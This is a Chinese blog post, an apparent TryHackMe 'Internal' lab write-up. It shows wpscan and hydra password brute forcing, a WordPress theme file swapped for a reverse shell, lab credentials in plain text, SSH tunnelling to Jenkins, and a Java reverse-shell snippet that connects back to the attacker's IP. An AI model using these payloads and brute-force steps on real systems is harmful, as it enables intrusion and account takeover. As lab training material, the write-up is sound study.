@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一句话总结：由wordpress到用户信息泄露获取所有权限  靶场概述难度： hard描述：渗透测试挑战您被分配到一个客户，该客户希望在三周内将环境发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最低信息，希望从恶意行为者的眼睛进行参与（黑盒渗透测试）。客户要求您获取两个标记（未提供位置）作为漏洞利用的证据： 此">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM-internal">
+<meta property="og:url" content="https://imli.ink/2024/11/23/internal/index.html">
+<meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
+<meta property="og:description" content="一句话总结：由wordpress到用户信息泄露获取所有权限  靶场概述难度： hard描述：渗透测试挑战您被分配到一个客户，该客户希望在三周内将环境发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最低信息，希望从恶意行为者的眼睛进行参与（黑盒渗透测试）。客户要求您获取两个标记（未提供位置）作为漏洞利用的证据： 此">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123183241.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123183430.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123183609.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123184239.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123184539.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123184713.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123185302.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123185213.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123185425.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123190238.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123190554.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123190825.png">
+<meta property="article:published_time" content="2024-11-23T09:55:36.213Z">
+<meta property="article:modified_time" content="2024-11-23T09:55:36.213Z">
+<meta property="article:author" content="Leon">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="THM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imli.ink/assets/img/Pasted%20image%2020241123183241.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>THM-internal</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-3YLDTM3C61"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-3YLDTM3C61');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="安全杂谈 | 网络安全、渗透测试、信息安全技术分享" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/sites/">站点</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/11/24/Alert/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/22/bookstoreoc/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/23/internal/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/23/internal/&text=THM-internal"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/23/internal/&is_video=false&description=THM-internal"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THM-internal&body=Check out this article: https://imli.ink/2024/11/23/internal/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/23/internal/&name=THM-internal&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/23/internal/&t=THM-internal"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶场概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">攻击向量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        THM-internal
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Leon</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-23T09:55:36.213Z" class="dt-published" itemprop="datePublished">2024-11-23</time>
+        
+        (Updated: <time datetime="2024-11-23T09:55:36.213Z" class="dt-updated" itemprop="dateModified">2024-11-23</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/THM/" rel="tag">THM</a>, <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+<p>一句话总结：由wordpress到用户信息泄露获取所有权限</p>
+</blockquote>
+<h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： hard<br>描述：渗透测试挑战<br>您被分配到一个客户，该客户希望在三周内将环境发布到生产环境中进行渗透测试。</p>
+<p><strong>工作范围</strong></p>
+<p>客户要求工程师对提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最低信息，希望从恶意行为者的眼睛进行参与（黑盒渗透测试）。客户要求您获取两个标记（未提供位置）作为漏洞利用的证据：</p>
+<p>此外，客户还提供了以下范围限额：</p>
+<ul>
+<li>确保修改 hosts 文件以反映 internal.thm</li>
+<li>此项目允许使用任何工具或技术</li>
+<li>找到并记录发现的所有漏洞</li>
+<li>将发现的标记提交到仪表板</li>
+<li>只有分配给计算机的 IP 地址在范围内</li>
+</ul>
+<p>我鼓励您将此挑战视为实际的渗透测试。考虑编写一份报告，包括执行摘要、漏洞和漏洞利用评估以及补救建议，因为这将使您为 eLearnsecurity eCPPT 或在该领域担任渗透测试员的职业做好准备。</p>
+<p>接受项目后，您将获得客户评估环境。保护 User 和 Root 标记，并将其作为漏洞利用证明提交到控制面板。</p>
+<hr>
+<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table>
+<thead>
+<tr>
+<th>🚀</th>
+<th>本地机器信息</th>
+<th>目标机器信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP</td>
+<td>10.17.5.121</td>
+<td>10.10.244.196</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>kali</td>
+<td>Linux</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~/SecLab/internal]</span><br><span class="line">└─$ rustscan -a 10.10.244.196</span><br><span class="line">Open 10.10.244.196:22</span><br><span class="line">Open 10.10.244.196:80</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">22/tcp open  ssh     syn-ack</span><br><span class="line">80/tcp open  http    syn-ack</span><br></pre></td></tr></table></figure>
+
+<p>路径探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http://10.10.244.196/</span><br><span class="line"> http://10.10.244.196/phpmyadmin</span><br><span class="line"> http://10.10.244.196/wordpress/wp-admin/</span><br></pre></td></tr></table></figure>
+<h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p>以80端口未入口点<br>    有两个cms 以wordpress未入口进行扫描<br>wpsan扫描<br><strong>(1) 基础扫描</strong><br><code>wpscan --url https://example.com</code><br><strong>（2）枚举用户和插件</strong></p>
+<p><code>wpscan --url https://example.com --enumerate u,p</code></p>
+<p><strong>（3）使用代理进行扫描</strong></p>
+<p><code>wpscan --url https://example.com --proxy http://127.0.0.1:8080</code></p>
+<p><strong>（4）暴力破解管理员账户</strong></p>
+<p><code>wpscan --url https://example.com --passwords passwords.txt --usernames admin --password-attack wp-login</code></p>
+<p><strong>（5）保存扫描结果为 JSON 文件</strong></p>
+<p><code>wpscan --url https://example.com --output results.json --format json</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://internal.thm/blog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://internal.thm/blog/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;</span><br><span class="line"> |  - http://internal.thm/blog/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2024-11-12T00:00:00.000Z</span><br><span class="line"> | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.8</span><br><span class="line"> | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.3 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: &#x27;Version: 2.3&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Most Popular Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection</span><br></pre></td></tr></table></figure>
+
+
+<p>尝试密码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="/../assets/img/Pasted%20image%2020241123183241.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123183241.png"></a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果能修改php文件可以替换后进行反弹shell</p>
+<p><a href="/../assets/img/Pasted%20image%2020241123183430.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123183430.png"></a><br><a href="/../assets/img/Pasted%20image%2020241123183609.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123183609.png"></a></p>
+<p>WordPress站点的大多数主题位于 &#x2F;wp-content&#x2F; 目录下，主题相关内容则位于 &#x2F;wp-content&#x2F;themes&#x2F; 目录下；根据我们之前所修改文件对应的主题名称，可知404.php文件位置为：&#x2F;wp-content&#x2F;themes&#x2F;twentyseventeen&#x2F;404.php 。（由之前的WPScan扫描结果也可知过时的主题相关页面url）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</span><br></pre></td></tr></table></figure>
+
+<p><a href="/../assets/img/Pasted%20image%2020241123184239.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123184239.png"></a></p>
+<p>升级为tty</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c &quot;import pty;pty.spawn(&#x27;bash&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>我们继续使用刚才的初始shell界面进行探索，尝试进一步列举文件和目录信息，最终在&#x2F;opt目录下发现了一个文件wp-save.txt–内容包含了用户名aubreanna及其登录凭据。</p>
+<p><a href="/../assets/img/Pasted%20image%2020241123184539.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123184539.png"></a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="/../assets/img/Pasted%20image%2020241123184713.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123184713.png"></a><br>由于目标机器的端口<code>8080</code>只能通过目标机的本地进行访问，所以我们需要设置SSH本地端口转发，从而将目标机器<code>8080</code>端口上的流量重定向到我们本地攻击机上的地址和端口<code>localhost:4567</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 4567:172.17.0.2:8080 aubreanna@internal.thm</span><br><span class="line">#根据前述结果，登录密码为：bubb13guM!@#123</span><br><span class="line">#ssh端口转发(本地网卡地址0.0.0.0可省略)：HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC</span><br><span class="line">#参数说明</span><br><span class="line">#-C：压缩数据</span><br><span class="line">#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。</span><br><span class="line">#-N ：不执行脚本或命令，通常与-f连用。</span><br><span class="line">#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。</span><br><span class="line">#-L : 本地隧道，本地端口:目标IP:目标端口</span><br><span class="line">#-D : 动态端口转发</span><br><span class="line">#-R : 远程隧道</span><br><span class="line">#-T ：不分配 TTY 只做代理用</span><br><span class="line">#-q ：安静模式，不输出 错误/警告 信息</span><br></pre></td></tr></table></figure>
+
+<p><a href="/../assets/img/Pasted%20image%2020241123185302.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123185302.png"></a></p>
+<p><a href="/../assets/img/Pasted%20image%2020241123185213.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123185213.png"></a></p>
+<p>我们接下来对该jenkins后台登录页面进行暴力破解，在此我们使用hydra工具，我们还需要获取关于登录框的请求表单数据来为hydra相关命令构造参数。</p>
+<p><a href="/../assets/img/Pasted%20image%2020241123185425.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123185425.png"></a><br>通过暴力破解获取到登录密码后，我们可以登录到jenkins后台，然后利用后台中的脚本控制面板写入<a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">反向shell脚本</a>内容，完成脚本内容写入后–我们就可以尝试执行相关的反向shell脚本（注意先在攻击机上设置一个Netcat监听器），即可获得一个shell界面–身份为jenkins。<br><a href="/../assets/img/Pasted%20image%2020241123190238.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123190238.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=&quot;10.17.5.121&quot;;</span><br><span class="line">int port=4445;</span><br><span class="line">String cmd=&quot;/bin/bash&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>
+
+<p><a href="/../assets/img/Pasted%20image%2020241123190554.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123190554.png"></a><br>使用ssh访问root用户并检索root.txt文件内容。</p>
+<p><a href="/../assets/img/Pasted%20image%2020241123190825.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123190825.png"></a></p>
+<h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/sites/">站点</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶场概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">攻击向量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
